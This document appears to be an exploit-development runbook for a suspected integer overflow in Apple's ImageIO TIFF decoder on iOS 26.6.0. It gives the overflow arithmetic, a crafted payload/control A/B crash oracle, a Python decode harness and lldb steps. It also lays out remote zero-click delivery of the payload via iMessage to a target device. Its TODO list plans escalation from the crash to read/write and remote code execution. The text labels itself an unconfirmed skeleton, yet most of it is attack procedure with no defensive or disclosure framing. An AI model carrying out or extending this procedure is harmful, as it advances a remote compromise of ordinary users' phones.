# ImageIO integer overflow — crash oracle runbook (iOS 26.6.0)

> ⚠️ **Status: PoC skeleton.** The overflow *class* is verified (64-bit → 32-bit
> wrap, see `imageio_int_overflow_poc.py`). The **exact overflow expression** in the
> iOS 26.6.0 ImageIO binary is **TODO** — confirm with a binary diff / lldb
> breakpoint on the TIFF decode path before trusting the crash as a positive.

## What the oracle measures

The decoder computes the decoded pixel-buffer size in 32-bit arithmetic:

```
size = width * height * samplesPerPixel * (bitsPerSample / 8)
```

Our crafted header makes `size` wrap:

| | value |
|---|---|
| 64-bit size | `0x100020001` (~4 GB) — what the decoder *writes* |
| 32-bit size | `0x20001` (128 KB) — what gets *malloc'd* |
| OOB write | `0x100000000` bytes past the buffer |

If the 32-bit overflow is real, decoding the payload writes ~4 GB into a 128 KB
buffer → **crash** (SIGSEGV / EXC_BAD_ACCESS). The control image (0x100×0x100)
decodes cleanly → **no crash**. That A/B is the oracle.

## A/B design

| Sample | File | Expected |
|---|---|---|
| **Payload** | `imageio_int_overflow_payload.tiff` | CRASH (OOB write) |
| **Control** | `imageio_int_overflow_control.tiff` | no crash |

A positive = payload crashes **and** control does not.

## Run 1 — local (fastest, macOS)

```bash
# Decode both with the same ImageIO path. Crash on payload, clean on control.
python3 - <<'PY'
from Foundation import NSURL
from CoreFoundation import CFDataCreateWithBytesNoCopy
import ImageIO as IIO, Quartz
def decode(path):
    url = NSURL.fileURLWithPath_(path)
    src = IIO.CGImageSourceCreateWithURL(url, None)
    img = IIO.CGImageSourceCreateImageAtIndex(src, 0, None)
    return img
print("payload:", decode("imageio_int_overflow_payload.tiff"))   # expect crash
print("control:", decode("imageio_int_overflow_control.tiff"))   # expect ok
PY
```

## Run 2 — lldb (confirm the overflow expression)

```
lldb -- python3 -c "..."        # or the jsc/decode harness
(lldb) breakpoint set -n CGImageDecode
(lldb) breakpoint set -n TIFFDecodeImage
(lldb) run
# at the size computation, inspect:
(lldb) p width * height * samplesPerPixel * (bitsPerSample/8)
(lldb) p (uint32_t)(width * height * samplesPerPixel * (bitsPerSample/8))
# if the two differ and the 32-bit value is used for malloc -> overflow confirmed
```

TODO: find the exact symbol / offset in the iOS 26.6.0 ImageIO binary
(`nm -m ... | grep -i tiff`, `otool -tv`).

## Run 3 — remote (iOS 26.6.0 device, via iMessage)

```
1. send imageio_int_overflow_payload.tiff as an iMessage attachment (0-click)
2. ImageIO decodes it in the receiving daemon (imagent / IMTranscoderAgent)
3. observe: process crash (crash log / delivery-receipt oracle)
4. A/B: send control -> no crash
```

Crash log to collect: `/var/mobile/Library/Logs/CrashLogs/` (or `imagent-*`).

## Interpretation

| Result | Meaning |
|---|---|
| payload crash + control clean | **overflow confirmed** → escalate to R/W (see research doc) |
| both clean | overflow not in this code path, or 64-bit arithmetic already used → re-derive dims |
| both crash | harness issue (e.g. huge RowsPerStrip) → reduce strip, isolate |

## TODO (version-specific)
- [ ] Exact overflow expression + symbol in iOS 26.6.0 ImageIO (binary diff / lldb)
- [ ] Confirm 32-bit (not 64-bit) arithmetic on the target build
- [ ] Delivery path: which daemon decodes iMessage attachments (imagent vs IMTranscoderAgent)
- [ ] Crash → R/W → RCE upgrade (heap layout control)
